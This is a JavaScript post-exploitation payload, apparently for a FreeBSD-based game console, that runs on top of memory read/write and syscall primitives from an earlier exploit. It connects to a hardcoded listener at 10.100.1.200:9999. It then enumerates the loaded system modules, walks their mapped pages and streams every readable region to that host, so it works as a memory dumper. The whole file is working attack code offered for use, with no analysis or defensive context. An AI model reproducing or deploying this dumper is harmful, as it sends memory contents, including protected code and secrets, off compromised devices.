(async function() {
    try {
        var LAPTOP_IP     = "10.100.1.200";
        var LAPTOP_PORT   = 9999;
        var CHUNK_SIZE    = 0x400n;
        var PAGE_SIZE     = 0x4000n;
        var MAX_GAP_RUNS  = 8;
        var UNMAPPED_SKIP = 0x200000n;
        var READABLE_PROTS = [0x1n, 0x3n, 0x11n, 0x13n];

        // Open network socket
        var sock = syscall(SYSCALL.socket, 2n, 1n, 0n);
        if (Number(sock) < 0) {
            await log("[-] socket failed");
            return;
        }

        // Initialize sockaddr structure
        var sockaddr = malloc(16n);
        for (var i = 0n; i < 16n; i++) write8(sockaddr + i, 0n);
        write8(sockaddr + 1n, 2n); // sin_family = AF_INET
        write16(sockaddr + 2n, ((LAPTOP_PORT >> 8) & 0xFF) | ((LAPTOP_PORT & 0xFF) << 8));

        var parts = LAPTOP_IP.split('.');
        for (var i = 0; i < 4; i++) {
            write8(sockaddr + 4n + BigInt(i), BigInt(parseInt(parts[i].trim(), 10)));
        }

        // Establish connection to listener
        if (Number(syscall(SYSCALL.connect, sock, sockaddr, 16n)) !== 0) {
            await log("[-] connect failed");
            syscall(SYSCALL.close, sock);
            return;
        }
        await log("[+] Connected to listener");

        // Allocate working buffers
        var out_buf   = malloc(0x40n);
        var zero_buf  = malloc(CHUNK_SIZE);
        var hdr_buf   = malloc(0x30n);
        var info_buf  = malloc(0x160n);
        var list_buf  = malloc(0x300n * 4n);
        var count_buf = malloc(0x8n);
        for (var i = 0n; i < CHUNK_SIZE; i++) write8(zero_buf + i, 0n);

        // Frame demarcator generator
        function send_separator(name) {
            var sep = malloc(0x20n);
            write32(sep,         0xCAFEBABE);
            write32(sep + 0x4n,  0xDEADC0DE);
            for (var i = 0n; i < 0x10n; i++) write8(sep + 0x8n + i, 0n);
            for (var i = 0; i < 16 && i < name.length; i++) {
                write8(sep + 0x8n + BigInt(i), BigInt(name.charCodeAt(i)));
            }
            syscall(SYSCALL.write, sock, sep, 0x20n);
        }

        // Segment header block construction
        function send_header(name, base, end, prot, type_flags) {
            write32(hdr_buf,          0xDEADBEEF);
            write64(hdr_buf + 0x08n,  base);
            write64(hdr_buf + 0x10n,  end);
            write32(hdr_buf + 0x18n,  Number(prot));
            write32(hdr_buf + 0x1cn,  Number(type_flags));
            for (var i = 0n; i < 8n; i++) write8(hdr_buf + 0x20n + i, 0n);
            for (var i = 0; i < 8 && i < name.length; i++) {
                write8(hdr_buf + 0x20n + BigInt(i), BigInt(name.charCodeAt(i)));
            }
            syscall(SYSCALL.write, sock, hdr_buf, 0x30n);
        }

        // Reliable region streaming loop
        function stream_region(region_base, region_end) {
            var addr = region_base;
            while (addr < region_end) {
                var remaining = region_end - addr;
                var chunk = remaining < CHUNK_SIZE ? remaining : CHUNK_SIZE;
                var ret = syscall(SYSCALL.write, sock, addr, chunk);

                // Pad with zeroes if memory read faults during transit
                if (Number(ret) <= 0) {
                    syscall(SYSCALL.write, sock, zero_buf, chunk);
                }
                addr += chunk;
            }
        }

        // Target parser engine
        async function scan_target(name, base) {
            send_separator(name);
            await log("[*] Streaming module: " + name + " @ " + toHex(base));

            var addr         = base;
            var unmapped_run = 0n;
            var gap_runs     = 0;

            while (gap_runs < MAX_GAP_RUNS) {
                for (var i = 0n; i < 0x40n; i++) write8(out_buf + i, 0n);
                var ret = syscall(0x223n, addr, out_buf); // query_memory_protection

                // Check for unmapped bounds or guard regions using signed representation
                if (BigInt.asIntN(64, ret) < 0n) {
                    unmapped_run += PAGE_SIZE;
                    if (unmapped_run >= UNMAPPED_SKIP) {
                        gap_runs++;
                        addr += UNMAPPED_SKIP;
                        unmapped_run = 0n;
                    } else {
                        addr += PAGE_SIZE;
                    }
                    continue;
                }

                gap_runs     = 0;
                unmapped_run = 0n;

                var r_base       = read64(out_buf);
                var r_end        = read64(out_buf + 0x8n);
                var flags_packed = read64(out_buf + 0x10n);
                var prot         = flags_packed & 0xFFFFFFFFn;
                var type_flags   = (flags_packed >> 32n) & 0xFFFFFFFFn;

                // Validate page protections against allowed read permissions
                if (READABLE_PROTS.indexOf(prot) !== -1) {
                    send_header(name, r_base, r_end, prot, type_flags);
                    stream_region(r_base, r_end);
                }

                var next = r_end > addr ? r_end : addr + PAGE_SIZE;
                addr = next;
            }

            await log("[*] Done: " + name);
        }

        // Enumerate loaded userland components
        write64(count_buf, 0n);
        var list_ret = syscall(0x250n, list_buf, 0x300n, count_buf); // dynlib_get_list
        var mod_count = Number(read64(count_buf));
        await log("[+] Loaded modules detected: " + mod_count + " (status ret=" + BigInt.asIntN(64, list_ret) + ")");

        // Step through module metadata table
        for (var m = 0; m < mod_count; m++) {
            var handle = read32(list_buf + BigInt(m) * 4n);
            for (var i = 0n; i < 0x160n; i++) write8(info_buf + i, 0n);
            write64(info_buf, 0x160n);

            var info_ret = syscall(0x251n, BigInt(handle), info_buf); // dynlib_get_info
            if (BigInt.asIntN(64, info_ret) < 0n) continue;

            var mod_base = read64(info_buf + 0x108n);

            // Extract the descriptive module ASCII string name
            var name_buf = "";
            for (var c = 0; c < 255; c++) {
                var ch = Number(read8(info_buf + 0x8n + BigInt(c)));
                if (ch === 0) break;
                name_buf += String.fromCharCode(ch);
            }

            if (mod_base === 0n) continue;
            await scan_target(name_buf, mod_base);
        }

        // Close connection cleanly
        syscall(SYSCALL.close, sock);
        await log("[*] Complete memory dump operation finished.");
    } catch(e) {
        await log("[-] Critical exception caught: " + e.message);
    }
})();
